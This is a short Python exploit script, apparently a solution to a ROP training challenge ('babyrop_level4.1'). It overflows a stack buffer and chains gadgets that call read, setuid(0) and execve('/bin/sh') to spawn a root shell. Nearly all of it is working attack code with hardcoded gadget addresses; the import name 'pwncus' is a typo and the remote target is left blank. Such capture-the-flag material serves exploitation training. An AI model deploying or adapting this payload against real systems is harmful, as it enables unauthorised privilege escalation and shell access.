#!/usr/bin/python3

from pwncus import *

# context.log_level = 'debug'
exe = context.binary = ELF('/challenge/babyrop_level4.1', checksec=False)

# GDB scripts for debugging
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''

b*0x000000000040224e
c
''')

p = remote('', ) if args.REMOTE else process(argv=[exe.path], aslr=False)
if args.GDB:
    GDB()
    input()

# ===========================================================
#                          EXPLOIT
# ===========================================================

# Use when leaked is needed
p.recvuntil(b'at: ')
stack_leak = int(p.recvuntil(b'.', drop=True), 16)
log.info("Stack leak: " + hex(stack_leak))

pop_rdi = 0x0000000000401fda
pop_rsi = 0x0000000000401fb2
pop_rdx = 0x0000000000401fba
pop_rax = 0x0000000000401fc3
syscall = 0x0000000000401fe2
rw_section = 0x405320

#Offset = 104
# Read
pl = b'A'*(88)
pl += p64(pop_rsi) + p64(rw_section)
pl += p64(pop_rdx) + p64(0x100)
pl += p64(pop_rdi) + p64(0)
pl += p64(pop_rax) + p64(0x0)
pl += p64(syscall)

# Setuid
pl += p64(pop_rax) + p64(0x69)
pl += p64(pop_rdi) + p64(0)
pl += p64(syscall)

# Execve
pl += p64(pop_rdi) + p64(rw_section)
pl += p64(pop_rsi) + p64(0)
pl += p64(pop_rdx) + p64(0)
pl += p64(pop_rax) + p64(0x3b)
pl += p64(syscall)

sl(pl)
sl(b'/bin/sh\x00\x00')
p.interactive()
